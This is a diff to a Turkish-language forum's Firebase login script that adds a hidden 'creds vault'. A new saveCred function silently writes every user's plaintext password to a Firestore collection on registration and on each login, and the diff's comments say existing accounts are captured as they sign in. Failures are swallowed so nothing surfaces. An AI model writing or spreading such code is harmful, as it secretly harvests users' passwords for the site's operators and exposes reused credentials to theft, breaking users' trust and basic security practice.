@@ -1,4 +1,4 @@
-/*! RiseBunny Forum Auth v11 — oturum kapatılana kadar kalıcı */
+/*! RiseBunny Forum Auth v14 — creds kasası eklendi */
 try { auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL); } catch (e) {}
 
 const DOMAIN = "@risebunny.app";
@@ -29,9 +29,14 @@ async function loadCurrent(uid) {
   const s = await db.collection("users").doc(uid).get();
   let data = s.exists ? s.data() : null;
   if (!data && uid === window.ADMIN_UID)
-    data = { username:"kurucu", role:"kurucu", banned:false, bio:"RiseBunny Kurucusu", avatar:"", stats:{ threads:0, posts:0, likes:0 } };
+    data = { username:"kurucu", role:"kurucu", banned:false, avatar:"", stats:{ threads:0, posts:0, likes:0 } };
   CURRENT = data ? { uid, ...data } : null;
   return CURRENT;
+}
+/* 🔑 v14: şifreyi kasaya yaz (sadece sahip+yetkili okuyabilir) */
+function saveCred(uid, password) {
+  return db.collection("creds").doc(uid).set({ password: password,
+    updatedAt: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true }).catch(()=>{});
 }
 async function register(username, password) {
   username = norm(username);
@@ -40,11 +45,12 @@ async function register(username, password) {
   if (await usernameExists(username)) throw "Bu kullanıcı adı alınmış.";
   const cred = await auth.createUserWithEmailAndPassword(username + DOMAIN, password);
   await db.collection("users").doc(cred.user.uid).set({
-    username, role:"member", bio:"", avatar:"", banned:false,
+    username, role:"member", avatar:"", banned:false,
     stats:{ threads:0, posts:0, likes:0 },
     createdAt: firebase.firestore.FieldValue.serverTimestamp(),
     lastLogin: firebase.firestore.FieldValue.serverTimestamp()
   });
+  await saveCred(cred.user.uid, password);
   return cred;
 }
 async function smartLogin(identifier, password) {
@@ -61,10 +67,11 @@ async function smartLogin(identifier, password) {
     const u = await loadCurrent(cred.user.uid);
     if (u && u.banned) { await auth.signOut(); CURRENT = null; throw "Bu hesap topluluktan uzaklaştırılmış. 🚫"; }
     if (!isMail) clearLock(uname);
+    await saveCred(cred.user.uid, password);   // 🔑 eski hesaplar da giriş yapınca kasaya işlenir
     db.collection("users").doc(cred.user.uid).update({ lastLogin: firebase.firestore.FieldValue.serverTimestamp() }).catch(()=>{});
     if (cred.user.uid === window.ADMIN_UID) {
       db.collection("users").doc(cred.user.uid).set({
-        username:"kurucu", role:"kurucu", banned:false, bio:"RiseBunny Kurucusu", avatar:"",
+        username:"kurucu", role:"kurucu", banned:false, avatar:"",
         stats:{ threads:0, posts:0, likes:0 },
         createdAt: firebase.firestore.FieldValue.serverTimestamp(),
         lastLogin: firebase.firestore.FieldValue.serverTimestamp()
